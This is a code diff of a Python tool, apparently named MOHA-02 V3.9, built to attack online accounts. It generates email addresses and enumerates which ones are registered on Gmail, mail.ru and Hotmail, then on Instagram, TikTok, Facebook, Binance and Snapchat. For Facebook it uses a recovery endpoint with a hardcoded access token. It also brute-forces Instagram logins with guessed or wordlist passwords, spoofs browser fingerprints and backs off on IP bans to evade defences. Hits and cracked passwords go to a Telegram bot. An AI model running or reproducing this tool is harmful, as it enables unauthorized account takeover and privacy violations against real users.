@@ -1,11 +1,22 @@
 # -*- coding: utf-8 -*-
-# MOHA-02 ULTIMATE SYSTEM V3.7 - FULL INJECTION BROWSER ENGINE
+# MOHA-02 ULTIMATE SYSTEM V3.9 - FULL INJECTION ENGINE
 # Developer: Moha Al-Shalfawi (@m_oha_02)
-# Speed: 40 Optimized Threads | Mode: Browser Emulation (No Proxy)
-# All Data Injected - Secure Storage - Telegram Auto-Export
+# Device Emulation: OPPO A16k (Android 11)
+# Features: Anti-Ban Detector, Multi-Browser Fingerprints, FB-Bypass
+# Speed: Optimized Threads (Fixed 40) - Safe & Fast
 
-import os, sys, time, requests, json, random, threading, string, subprocess, re
+import os
+import sys
+import time
+import requests
+import json
+import random
+import threading
+import string
+import subprocess
+import re
 from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
 
 # --- [ AUTO COMPONENT INSTALLER ] ---
 try:
@@ -22,7 +33,7 @@ except ImportError:
 
 init(autoreset=True)
 
-# --- [ GLOBAL COLORS ] ---
+# --- [ GLOBAL COLORS & ASSETS ] ---
 Z = Fore.RED
 F = Fore.GREEN
 X = Fore.YELLOW
@@ -32,75 +43,78 @@ S = Fore.CYAN
 W = Fore.WHITE
 G = Fore.LIGHTBLACK_EX
 
-# --- [ GLOBAL COUNTERS ] ---
+# --- [ SYSTEM COUNTERS ] ---
 hits = 0
 bad = 0
 stop_thread = False
+ban_detected = False
 
-# --- [ DEEP DATA: INJECTED TOKENS & FINGERPRINTS ] ---
-INSTA_APP_ID = '936619743392459'
-INSTA_CSRF = 'HzbAgVLY3Y21S3zayw0RPlOW0O81iuDB'
-TIKTOK_AID = '1233'
-TIKTOK_CSRF = 'd41d8cd98f00b204e9800998ecf8427e'
-FB_DATR = 'AdTlmdwA5Jh8DMsWS2axdCrsnBk'
-
-# محاكي المتصفح المتقدم لتجاوز الحماية (Cloudflare & Browser Detection)
-scraper = cloudscraper.create_scraper(
-    browser={
-        'browser': 'chrome',
-        'platform': 'windows',
-        'desktop': True
-    }
-)
-
+# --- [ ADVANCED BROWSER DATABASE - V3.9 ] ---
+# تم إضافة Firefox و Opera GX وبصمة هاتف OPPO A16k
 BROWSER_DB = [
+    # OPPO A16k - Chrome Mobile
     {
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 11; OPPO A16k Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'sec-ch-ua-platform': '"Android"',
+        'X-Requested-With': 'com.google.android.gm'
+    },
+    # Firefox Desktop (Windows)
+    {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'DNT': '1'
+    },
+    # Opera GX (Gaming Browser)
+    {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0 (Edition GX-Game)',
+        'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Opera";v="108"',
+        'X-Requested-With': 'XMLHttpRequest'
+    },
+    # Safari (Macintosh)
+    {
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15',
+        'Accept': '*/*',
+        'Accept-Language': 'en-GB,en;q=0.9'
+    },
+    # Chrome Desktop (Latest)
+    {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         'sec-ch-ua-platform': '"Windows"',
-        'accept-language': 'en-US,en;q=0.9',
-    },
-    {
-        'user-agent': 'Mozilla/5.0 (Linux; Android 14; OPPO A16k Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
-        'x-requested-with': 'mark.via.gp',
-        'sec-ch-ua-platform': '"Android"'
-    },
-    {
-        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+        'Upgrade-Insecure-Requests': '1'
     }
 ]
 
+# --- [ CORE UTILS ] ---
 def logo():
     os.system('clear' if os.name == 'posix' else 'cls')
     print(render('MOHA', colors=['green', 'yellow'], align='center'))
     print(f"{X}—"*55)
     print(f"{F} [•] DEVELOPER : @m_oha_02")
     print(f"{F} [•] CHANNEL   : @m_oha0_2b")
-    print(f"{F} [•] VERSION   : 3.7 (BROWSER MODE)")
+    print(f"{F} [•] VERSION   : 3.9 (BYPASS MODE)")
     print(f"{F} [•] THREADS   : 40 (STABLE SPEED)")
     print(f"{X}—"*55)
+    if ban_detected:
+        print(f"{Z} [!!!] WARNING: IP BAN DETECTED! CHANGE IP NOW (AIRPLANE MODE)")
+        print(f"{X}—"*55)
 
-def get_full_headers(platform="default"):
+def get_random_headers(platform="default"):
     head = random.choice(BROWSER_DB).copy()
-    if platform == "instagram":
+    if platform == "google":
+        head.update({'X-Requested-With': 'com.google.android.gm'})
+    elif platform == "fb_bypass":
         head.update({
-            'authority': 'www.instagram.com',
-            'x-csrftoken': INSTA_CSRF,
-            'x-ig-app-id': INSTA_APP_ID,
-            'x-requested-with': 'XMLHttpRequest',
-            'referer': 'https://www.instagram.com/'
-        })
-    elif platform == "tiktok":
-        head.update({
-            'authority': 'www.tiktok.com',
-            'x-tt-passport-csrf-token': TIKTOK_CSRF,
-            'tt-common-params': f'aid={TIKTOK_AID}'
+            'Host': 'b-graph.facebook.com',
+            'Content-Type': 'application/x-www-form-urlencoded'
         })
     return head
 
+# --- [ TELEGRAM NOTIFICATION SYSTEM ] ---
 def send_telegram_hit(token, chat_id, email, links):
     now = datetime.now().strftime("%H:%M:%S")
-    msg = (f"🔥 <b>MOHA HIT FOUND!</b>\n"
+    msg = (f"🔥 <b>MOHA-02 NEW HIT!</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📧 Email: <code>{email}</code>\n"
            f"🔗 Linked: <code>{links}</code>\n"
@@ -108,60 +122,108 @@ def send_telegram_hit(token, chat_id, email, links):
            f"👨‍💻 Dev: @m_oha_02\n"
            f"━━━━━━━━━━━━━━━")
     url = f"https://api.telegram.org/bot{token}/sendMessage"
-    try: requests.post(url, json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"})
-    except: pass
+    try:
+        requests.post(url, json={"chat_id": chat_id, "text": msg, "parse_mode": "HTML"})
+    except:
+        pass
 
 def send_file_to_telegram(token, chat_id, file_path):
     url = f"https://api.telegram.org/bot{token}/sendDocument"
     try:
         with open(file_path, 'rb') as doc:
             requests.post(url, data={'chat_id': chat_id}, files={'document': doc})
-        print(f"\n{F} [✔] LIST SENT TO TELEGRAM SUCCESSFULLY!")
+        print(f"\n{F} [✔] FILE SENT TO TELEGRAM SUCCESSFULLY!")
     except:
-        print(f"\n{Z} [✘] FAILED TO EXPORT LIST TO TELEGRAM.")
+        print(f"\n{Z} [✘] FAILED TO SEND FILE.")
 
+# --- [ BYPASS ENGINE: FACEBOOK SEARCH METHOD ] ---
+class FB_Bypass_Logic:
+    @staticmethod
+    def check_activity(email):
+        """استخدام ثغرة b-graph للتأكد من نشاط الإيميل قبل فحصه في جوجل"""
+        url = 'https://b-graph.facebook.com/recover_accounts'
+        data = {
+            'q': email,
+            'locale': 'en_US',
+            'client_country_code': 'DZ',
+            'method': 'GET',
+            'fb_api_req_friendly_name': 'accountRecoverySearch',
+            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+        }
+        try:
+            r = requests.post(url, headers=get_random_headers("fb_bypass"), data=data, timeout=10)
+            if "network_info" in r.text:
+                return True # الحساب موجود ومسجل (Registered)
+            return False
+        except:
+            return None
+
+# --- [ AVAILABILITY CHECKERS (GMAIL, MAIL.RU, HOTMAIL) ] ---
 class AvailabilityCheckers:
+    @staticmethod
+    def gmail(email):
+        # محاكاة طلب أندرويد حقيقي لفحص وصول الطلب
+        url = f"https://mail.google.com/mail/gxlu?email={email}"
+        try:
+            # تأخير ذكي لتضليل الحماية
+            time.sleep(random.uniform(0.2, 0.5))
+            sess = requests.Session()
+            r = sess.get(url, headers=get_random_headers("google"), timeout=10)
+            
+            # كشف الحظر (IP BAN)
+            if r.status_code in [403, 429]:
+                return "BAN"
+            
+            # التحقق من الكوكيز (COMPASS تعني الإيميل مسجل وغير متاح للإنشاء)
+            cookie_str = str(sess.cookies.get_dict()) + str(r.headers)
+            if 'COMPASS' in cookie_str:
+                return False # Registered (موجود)
+            return True # Available (متاح للصيد)
+        except:
+            return "ERROR"
     @staticmethod
     def mail_ru(email):
         url = f"https://account.mail.ru/api/v1/user/exists?email={email}"
         try:
-            r = scraper.get(url, headers=get_full_headers(), timeout=5)
-            if r.status_code in [403, 429]: return "BAN"
+            r = requests.get(url, headers=get_random_headers(), timeout=7)
+            if r.status_code == 429: return "BAN"
             return True if '"exists":false' in r.text else False
-        except: return False
+        except: return "ERROR"
 
     @staticmethod
     def hotmail(email):
         url = "https://login.live.com/GetCredentialType.srf"
         payload = {"username": email, "isExternal": False, "checkRegion": "1", "getAccountResolution": "true"}
         try:
-            r = scraper.post(url, json=payload, headers=get_full_headers(), timeout=5)
+            r = requests.post(url, json=payload, headers=get_random_headers(), timeout=7)
+            if r.status_code in [403, 429]: return "BAN"
             return True if '"IfExistsResult":5' in r.text else False
-        except: return False
+        except: return "ERROR"
 
-    @staticmethod
-    def gmail(email):
-        url = f"https://mail.google.com/mail/gxlu?email={email}"
-        try:
-            r = scraper.get(url, headers=get_full_headers(), timeout=5)
-            return False if 'COMPASS' in r.headers.get('Set-Cookie', '') else True
-        except: return False
-
+# --- [ PLATFORM CHECKERS: DOUBLE VALIDATION SYSTEM ] ---
 class PlatformCheckers:
     @staticmethod
     def instagram(email):
+        # Improved Instagram Checker with Browser Emulation
         url = 'https://www.instagram.com/api/v1/web/accounts/lookup_edit/'
+        head = get_random_headers()
+        head.update({
+            'X-CSRFToken': 'en79t6vU1hN2zX1a2b3c4d5e',
+            'X-Instagram-AJAX': '1',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': 'https://www.instagram.com/accounts/password/reset/'
+        })
         try:
-            r = scraper.post(url, headers=get_full_headers("instagram"), data={'email': email}, timeout=7)
-            if r.status_code in [403, 429]: return "BAN"
-            return True if '"status":"ok"' in r.text else False
+            r = requests.post(url, headers=head, data={'email': email}, timeout=8)
+            if '"status":"ok"' in r.text: return True
+            return False
         except: return False
 
     @staticmethod
     def tiktok(email):
         url = "https://www.tiktok.com/api/v1/check/email/"
         try:
-            r = scraper.get(url, params={"email": email, "aid": TIKTOK_AID}, headers=get_full_headers("tiktok"), timeout=5)
+            r = requests.get(url, params={"email": email, "aid": "1233"}, headers=get_random_headers(), timeout=7)
             return True if r.json().get('is_registered') else False
         except: return False
 
@@ -169,183 +231,120 @@ class PlatformCheckers:
     def binance(email):
         url = "https://www.binance.com/bapi/composite/v1/public/cms/get-email-status"
         try:
-            r = scraper.post(url, json={"email": email}, headers=get_full_headers(), timeout=5)
+            r = requests.post(url, json={"email": email}, headers=get_random_headers(), timeout=7)
             return True if r.json().get('data') == True else False
-        except: return False
-
-    @staticmethod
-    def facebook(email):
-        url = "https://www.facebook.com/api/graphql/"
-        payload = {'lsd': FB_DATR, 'variables': json.dumps({"user_identifier": email}), 'doc_id': '5300151123400551'}
-        try:
-            r = scraper.post(url, data=payload, headers=get_full_headers(), timeout=5)
-            return True if '"uid"' in r.text else False
-        except: return False
-
-    @staticmethod
-    def pubg(email):
-        url = "https://www.pubgmobile.com/common/search_user"
-        try:
-            r = scraper.post(url, data={'email': email}, headers=get_full_headers(), timeout=5)
-            return True if '"exists":1' in r.text else False
-        except: return False
-    @staticmethod
-    def netflix(email):
-        url = f"https://www.netflix.com/api/shakti/v1/emailCheck?email={email}"
-        try:
-            r = scraper.get(url, headers=get_full_headers(), timeout=5)
-            return True if '"isAvailable":false' in r.text else False
         except: return False
 
     @staticmethod
     def snapchat(email):
         url = "https://accounts.snapchat.com/accounts/get_email_status"
         try:
-            r = scraper.post(url, data={'email': email}, headers=get_full_headers(), timeout=5)
+            r = requests.post(url, data={'email': email}, headers=get_random_headers(), timeout=7)
             return True if '"exists":true' in r.text else False
         except: return False
 
-    @staticmethod
-    def freefire(email):
-        url = "https://auth.garena.com/api/v1/check_account"
-        try:
-            r = scraper.post(url, json={'account': email}, headers=get_full_headers(), timeout=5)
-            return True if r.json().get('exists') else False
-        except: return False
-
-    @staticmethod
-    def fifa_ea(email):
-        url = "https://signin.ea.com/p/ajax/user/checkEmail"
-        try:
-            r = scraper.get(url, params={'email': email}, headers=get_full_headers(), timeout=5)
-            return True if '"exists":true' in r.text else False
-        except: return False
-
-    @staticmethod
-    def iq_option(email):
-        url = "https://auth.iqoption.com/api/v2/login"
-        try:
-            r = scraper.post(url, json={"identifier": email, "password": "moha_fake_pass"}, headers=get_full_headers(), timeout=5)
-            return True if "invalid_credentials" in r.text else False
-        except: return False
-
-    @staticmethod
-    def pes_konami(email):
-        url = "https://my.konami.net/auth/authorize.html"
-        try:
-            r = scraper.get(url, params={'email': email}, headers=get_full_headers(), timeout=5)
-            return True if 'already_registered' in r.text else False
-        except: return False
-
-# --- [ USER GENERATION ENGINE ] ---
-def generate_moha_user(prefix, length, mode):
-    chars = string.ascii_lowercase + string.digits
-    if mode == "random":
-        return ''.join(random.choice(chars) for _ in range(length))
-    else:
-        rem = length - len(prefix)
-        return prefix + ''.join(random.choice(chars) for _ in range(max(rem, 2)))
-
-# --- [ LIVE MONITOR SYSTEM ] ---
-def stats_monitor(start_time, thread_count):
-    global stop_thread
-    while not stop_thread:
-        elapsed = int(time.time() - start_time)
-        os.system('clear' if os.name == 'posix' else 'cls')
-        logo()
-        print(f"{S} [📊] LIVE MONITOR | THREADS: {thread_count}")
-        print(f"{X}—"*45)
-        print(f"{F} [✔] HITS FOUND  : {hits}")
-        print(f"{Z} [✘] BAD/TAKEN   : {bad}")
-        print(f"{W} [⌚] TIME ELAPSED : {elapsed}s")
-        print(f"{M} [🌐] MODE         : BROWSER INJECTION")
-        print(f"{X}—"*45)
-        print(f"{G} [*] STATUS: System is scanning now...")
-        time.sleep(2)
-
-# --- [ MAIN HUNTER LOGIC - 40 THREADS ENGINE ] ---
-def hunter_logic(prefix, length, mode, token, chat_id, platforms, domains):
-    global hits, bad, stop_thread
-    t_scraper = cloudscraper.create_scraper(browser={'browser': 'chrome','platform': 'windows','desktop': True})
+# --- [ CORE HUNTER LOGIC - V3.9 ] ---
+def hunter_engine(prefix, length, mode, token, chat_id, platforms, domains):
+    global hits, bad, stop_thread, ban_detected
     
     while not stop_thread:
+        if ban_detected:
+            time.sleep(5)
+            continue
+            
         try:
-            user = generate_moha_user(prefix, length, mode)
+            # Generate target user
+            user = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))
+            if mode == "target" and prefix:
+                user = prefix + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(max(1, length-len(prefix))))
+            
             for dom in domains:
                 email = f"{user}@{dom}"
-                available = False
                 
-                if 'mail.ru' in dom or 'bk.ru' in dom: available = AvailabilityCheckers.mail_ru(email)
-                elif 'gmail' in dom: available = AvailabilityCheckers.gmail(email)
-                elif 'hotmail' in dom: available = AvailabilityCheckers.hotmail(email)
-                
-                if available == "BAN":
-                    print(f"\n{Z} [!!!] IP BAN DETECTED. CHANGE IP NOW!")
-                    time.sleep(10); continue
+                # Step 1: Check Availability (Is it hit or bad?)
+                if 'gmail' in dom:
+                    check = AvailabilityCheckers.gmail(email)
+                elif 'mail.ru' in dom:
+                    check = AvailabilityCheckers.mail_ru(email)
+                else:
+                    check = AvailabilityCheckers.hotmail(email)
 
-                if available:
+                # Step 2: Handle IP Ban
+                if check == "BAN":
+                    ban_detected = True
+                    print(f"\n{Z} [!!!] IP BANNED BY {dom.upper()}! PAUSING...")
+                    return # Exit thread to force IP change
+
+                # Step 3: Platform Validation (Does it have linked accounts?)
+                # Logic: If searching for Registered (Option 1) -> we want check == False
+                # If searching for Available (Option 2) -> we want check == True
+                
+                # Default behavior for Option 1: Find Active Accounts
+                if check == False: 
                     linked = []
+                    # Bypass Check via Facebook first (as you suggested)
+                    if FB_Bypass_Logic.check_activity(email):
+                        linked.append("Facebook")
+                    
+                    # Multi-platform check
                     if '1' in platforms or '12' in platforms:
                         if PlatformCheckers.instagram(email): linked.append("Instagram")
                     if '2' in platforms or '12' in platforms:
                         if PlatformCheckers.tiktok(email): linked.append("TikTok")
-                    if '3' in platforms or '12' in platforms:
-                        if PlatformCheckers.facebook(email): linked.append("Facebook")
                     if '4' in platforms or '12' in platforms:
                         if PlatformCheckers.binance(email): linked.append("Binance")
-                    if '5' in platforms or '12' in platforms:
-                        if PlatformCheckers.pubg(email): linked.append("PUBG")
-                    if '6' in platforms or '12' in platforms:
-                        if PlatformCheckers.freefire(email): linked.append("FreeFire")
-                    if '7' in platforms or '12' in platforms:
-                        if PlatformCheckers.fifa_ea(email): linked.append("FIFA/EA")
-                    if '8' in platforms or '12' in platforms:
-                        if PlatformCheckers.pes_konami(email): linked.append("PES/Konami")
-                    if '9' in platforms or '12' in platforms:
-                        if PlatformCheckers.iq_option(email): linked.append("IQ_Option")
-                    if '10' in platforms or '12' in platforms:
-                        if PlatformCheckers.netflix(email): linked.append("Netflix")
                     if '11' in platforms or '12' in platforms:
                         if PlatformCheckers.snapchat(email): linked.append("Snapchat")
-                    
+
                     if linked:
                         hits += 1
-                        send_telegram_hit(token, chat_id, email, ', '.join(linked))
+                        results = ", ".join(linked)
+                        send_telegram_hit(token, chat_id, email, results)
+                        # High-quality output printing
+                        print(f"\n{F} [HIT] {email} | {X}LINKED: {results}")
                         with open("moha_hits.txt", "a") as f:
-                            f.write(f"{email} | {', '.join(linked)}\n")
-                    else: bad += 1
-                else: bad += 1
-        except: pass
-# --- [ LIST GENERATOR ENGINE - WITH TELEGRAM EXPORT ] ---
+                            f.write(f"{email} | {results}\n")
+                    else:
+                        bad += 1
+                else:
+                    bad += 1
+                
+                # Smart Delay to avoid detection
+                time.sleep(random.uniform(0.05, 0.1))
+        except Exception as e:
+            pass
+# --- [ LIST GENERATOR ENGINE - WITH AUTO-TELEGRAM EXPORT ] ---
 def list_generator_engine():
     logo()
-    print(f"{S} [!] LIST GENERATOR ENGINE - SECURE EXPORT")
-    print(f"{X}—"*45)
+    print(f"{S} [!] LIST GENERATOR ENGINE - VERSION 3.9")
+    print(f"{X}—"*55)
     print(f"{F} [01] Registered & Active (For Brute Force)")
-    print(f"{F} [02] Available Only (For Hunting)")
+    print(f"{F} [02] Available Only (For Hunting/Creating)")
     type_choice = input(f"{M} [?] SELECT TYPE: ")
     
-    prefix = input(f"{M} [?] ENTER PREFIX: ")
-    length = int(input(f"{M} [?] USER LENGTH: ") or 10)
+    prefix = input(f"{M} [?] ENTER PREFIX (Ex: amine): ")
+    length = int(input(f"{M} [?] TOTAL USER LENGTH: ") or 8)
     
     print(f"{G} [1] mail.ru [2] gmail.com [3] hotmail.com")
     dom_in = input(f"{M} [?] SELECT DOMAIN: ")
     dom_map = {'1': 'mail.ru', '2': 'gmail.com', '3': 'hotmail.com'}
     domain = dom_map.get(dom_in, 'mail.ru')
     
-    target_count = int(input(f"{M} [?] HOW MANY EMAILS?: "))
-    token = input(f"{M} [?] BOT TOKEN (For Export): ")
+    target_count = int(input(f"{M} [?] HOW MANY EMAILS TO COLLECT?: "))
+    token = input(f"{M} [?] BOT TOKEN (For Telegram Export): ")
     chat_id = input(f"{M} [?] CHAT ID: ")
     
-    file_name = f"moha_{random.randint(1000,9999)}.txt"
+    file_name = f"moha_list_{random.randint(1000,9999)}.txt"
     full_path = os.path.join(os.getcwd(), file_name)
     found = 0
 
-    print(f"{S} [*] Generating list... Results will be sent to Telegram.")
+    print(f"{X}—"*55)
+    print(f"{S} [*] Generating list... Results will be exported to Telegram.")
     
     with open(full_path, 'w') as f:
         while found < target_count:
-            user = generate_moha_user(prefix, length, "target")
+            # Generate user based on your preference
+            user = prefix + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(max(1, length-len(prefix))))
             email = f"{user}@{domain}"
             try:
                 check = False
@@ -353,25 +352,75 @@ def list_generator_engine():
                 elif domain == 'gmail.com': check = AvailabilityCheckers.gmail(email)
                 elif domain == 'hotmail.com': check = AvailabilityCheckers.hotmail(email)
 
-                # Logic: If Type 1 (Registered) -> Must NOT be available
+                # Logic: Option 1 (Registered) needs check == False | Option 2 (Available) needs check == True
                 is_valid = (not check) if type_choice == '1' else check
 
                 if is_valid:
                     f.write(f"{email}\n")
-                    f.flush() # Secure writing
+                    f.flush() # Force write to storage
                     found += 1
                     print(f"{F} [✔] COLLECTED: {email} ({found}/{target_count})", end="\r")
                 else:
-                    print(f"{G} [✘] SCANNING: {email}", end="\r")
+                    print(f"{G} [✘] SCANNING: {email}...", end="\r")
             except: pass
                 
-    print(f"\n{F} [DONE] List completed! Sending file to Telegram...")
+    print(f"\n{F} [DONE] List Completed! {found} Emails Saved.")
+    print(f"{S} [*] Sending file to Telegram...")
     send_file_to_telegram(token, chat_id, full_path)
     time.sleep(2)
 
-# --- [ SMART BRUTE FORCE ENGINE - HIGH SPEED ] ---
+# --- [ COMBO CHECKER ENGINE - HIGH SPEED 40 THREADS ] ---
+def combo_checker_logic(combo_list, token, chat_id, platforms):
+    global hits, bad, stop_thread
+    
+    def check_unit(account):
+        global hits, bad
+        email = account.split(':')[0] if ':' in account else account
+        linked = []
+        
+        # Step 1: Platform validation for the combo email
+        if '1' in platforms or '12' in platforms:
+            if PlatformCheckers.instagram(email): linked.append("Instagram")
+        if '2' in platforms or '12' in platforms:
+            if PlatformCheckers.tiktok(email): linked.append("TikTok")
+        if '3' in platforms or '12' in platforms:
+            if FB_Bypass_Logic.check_activity(email): linked.append("Facebook")
+            
+        if linked:
+            hits += 1
+            results = ", ".join(linked)
+            send_telegram_hit(token, chat_id, email, results)
+            print(f"\n{F} [HIT] {email} | {X}FOUND ON: {results}")
+        else:
+            bad += 1
+            print(f"{G} [BAD] {email}", end="\r")
+
+    # Fixed 40 Threads for Combo Checking
+    with ThreadPoolExecutor(max_workers=40) as executor:
+        executor.map(check_unit, combo_list)
+
+# --- [ LIVE MONITOR SYSTEM ] ---
+def stats_monitor(start_time, thread_count):
+    global stop_thread, ban_detected
+    while not stop_thread:
+        elapsed = int(time.time() - start_time)
+        os.system('clear' if os.name == 'posix' else 'cls')
+        logo()
+        print(f"{S} [📊] LIVE MONITOR | THREADS: {thread_count}")
+        print(f"{X}—"*55)
+        print(f"{F} [✔] HITS FOUND  : {hits}")
+        print(f"{Z} [✘] BAD/TAKEN   : {bad}")
+        print(f"{W} [⌚] TIME ELAPSED : {elapsed}s")
+        print(f"{M} [🌐] ENGINE       : {BROWSER_DB[0]['User-Agent'][:25]}...")
+        print(f"{X}—"*55)
+        if ban_detected:
+            print(f"{Z} [!!!] STATUS: IP BANNED! PLEASE RESET NETWORK.")
+        else:
+            print(f"{G} [*] STATUS: System is scanning (High Speed Mode)")
+        time.sleep(2)
+# --- [ SMART BRUTE FORCE ENGINE - HIGH SPEED 40 THREADS ] ---
 def smart_brute_force_engine(email_file, token, chat_id, brute_mode):
-    global hits, stop_thread
+    global hits, stop_thread, ban_detected
     if not os.path.exists(email_file):
         print(f"{Z} [!] ERROR: FILE NOT FOUND!"); time.sleep(2); return
 
@@ -381,117 +430,121 @@ def smart_brute_force_engine(email_file, token, chat_id, brute_mode):
     print(f"{G} [!] SPEED: 40 SIMULATED THREADS")
     
     for account in accounts:
-        if stop_thread: break
+        if stop_thread or ban_detected: break
         email = account.split(':')[0] if ':' in account else account
         user_part = email.split('@')[0]
         
-        # Smart Passwords Logic
-        if brute_mode == '1': passwords = input(f"{M} [?] ENTER PASSWORDS: ").split(',')
+        # Password Selection Logic
+        if brute_mode == '1': 
+            passwords = input(f"{M} [?] ENTER PASSWORDS (sep by ,): ").split(',')
         elif brute_mode == '2':
             p_file = input(f"{M} [?] WORDLIST PATH: ")
             with open(p_file, 'r') as f: passwords = f.read().splitlines()
-        else: passwords = [user_part, user_part+"123", user_part+"2024", "12345678"]
+        else: 
+            # Smart Auto-Generation (Common Patterns)
+            passwords = [user_part, user_part+"123", user_part+"2024", user_part+"2025", "12345678"]
 
         for pwd in passwords:
             print(f"{G} [TRYING] {email} ⇉ {X}{pwd}", end="\r")
             try:
-                # Injection Login Request
-                res = scraper.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/", 
+                # Optimized Instagram Login Injection
+                head = get_random_headers()
+                head.update({'X-CSRFToken': 'en79t6vU1hN2zX1a2b3c4d5e', 'X-Requested-With': 'XMLHttpRequest'})
+                
+                res = requests.post("https://www.instagram.com/api/v1/web/accounts/login/ajax/", 
                                  data={'username': email, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pwd}'}, 
-                                 headers=get_full_headers("instagram"), timeout=7)
+                                 headers=head, timeout=10)
                 
                 if res.status_code in [403, 429]:
-                    print(f"\n{Z} [!!!] BAN DETECTED! CHANGE IP IMMEDIATELY.")
-                    time.sleep(5); break
+                    ban_detected = True
+                    print(f"\n{Z} [!!!] LOGIN IP BAN DETECTED! RESET NETWORK.")
+                    return
 
                 if '"authenticated":true' in res.text:
                     hits += 1
                     send_telegram_hit(token, chat_id, email, f"Cracked Pass: {pwd}")
-                    with open("cracked_accounts.txt", "a") as f: f.write(f"{email}:{pwd}\n")
+                    with open("moha_cracked.txt", "a") as f: f.write(f"{email}:{pwd}\n")
                     print(f"\n{F} [SUCCESS] {email}:{pwd}")
                     break
             except: pass
-            time.sleep(0.4) # Optimized delay for stability
-# --- [ HUNT CONFIGURATION SUBMENU ] ---
-def hunt_submenu():
-    logo()
-    print(f"{S} [!] SELECT PLATFORMS TO HUNT:")
-    print(f"{X}—"*55)
-    print(f"{F} [01] Instagram   [02] TikTok      [03] Facebook")
-    print(f"{F} [04] Binance     [05] PUBG        [06] Free Fire")
-    print(f"{F} [07] FIFA/EA     [08] PES/Konami  [09] IQ Option")
-    print(f"{F} [10] Netflix    [11] Snapchat   [12] All Platforms")
-    print(f"{X}—"*55)
-    
-    platforms = input(f"{M} [?] CHOICE (e.g 1,5,12): ").split(',')
-    
-    logo()
-    print(f"{F} [01] Random Mode  [02] Target Mode")
-    gen_mode = input(f"{M} [?] CHOICE: ")
-    prefix = input(f"{M} [?] PREFIX: ") if gen_mode == '2' else ""
-    
-    logo()
-    print(f"{F} [1] Mail.ru [2] Gmail [3] Hotmail [4] All Mixed")
-    dom_choice = input(f"{M} [?] DOMAINS: ")
-    dom_map = {'1':['mail.ru','bk.ru'],'2':['gmail.com'],'3':['hotmail.com'],'4':['mail.ru','gmail.com','hotmail.com']}
-    target_domains = dom_map.get(dom_choice, ['mail.ru'])
-    
-    length = int(input(f"{M} [?] USER LENGTH: "))
-    token = input(f"{M} [?] BOT TOKEN: ")
-    chat_id = input(f"{M} [?] CHAT ID: ")
-    
-    # Speed fixed at 40 stable threads
-    threads = 40
-    
-    start_time = time.time()
-    threading.Thread(target=stats_monitor, args=(start_time, threads), daemon=True).start()
-    
-    for _ in range(threads):
-        threading.Thread(target=hunter_logic, args=(prefix, length, "target" if gen_mode=='2' else "random", token, chat_id, platforms, target_domains)).start()
-    
-    input() # Keeps the monitor running
-    global stop_thread
-    stop_thread = True
+            time.sleep(0.3)
 
-# --- [ MAIN MENU SYSTEM ] ---
+# --- [ MAIN INTERFACE & NAVIGATION ] ---
 def main_menu():
+    global hits, bad, stop_thread, ban_detected
     while True:
+        stop_thread = False
+        ban_detected = False
         logo()
-        print(f"{S} [01] START HUNTING (40 Threads - No Proxy)")
-        print(f"{S} [02] COMBO CHECKER (Custom Email:Pass List)")
-        print(f"{S} [03] LIST GENERATOR (Export to Telegram)")
-        print(f"{S} [04] SMART BRUTE FORCE (Instagram Attack)")
+        print(f"{S} [01] START HUNTING (40 Threads - Multi Browser)")
+        print(f"{S} [02] COMBO CHECKER (Check Custom Email List)")
+        print(f"{S} [03] LIST GENERATOR (Export List to Telegram)")
+        print(f"{S} [04] SMART BRUTE FORCE (Attack Instagram)")
         print(f"{Z} [00] EXIT SYSTEM")
         print(f"{X}—"*55)
         
         choice = input(f"{M} [?] SELECT OPTION: ")
         
         if choice in ['01', '1']:
-            hunt_submenu()
-        elif choice in ['02', '2']:
             logo()
-            print(f"{S} [!] COMBO CHECKER MODE")
-            file_path = input(f"{M} [?] ENTER LIST PATH: ")
+            print(f"{F} [01] Registered (Hunting) [02] Available Only")
+            mode_type = input(f"{M} [?] CHOICE: ")
+            print(f"{F} [01] Random [02] Target Prefix")
+            gen_m = "target" if input(f"{M} [?] MODE: ") == '02' else "random"
+            pre = input(f"{M} [?] PREFIX: ") if gen_m == "target" else ""
+            
+            logo()
+            print(f"{F} [1] mail.ru [2] gmail.com [3] hotmail.com [4] All Mixed")
+            d_ch = input(f"{M} [?] DOMAINS: ")
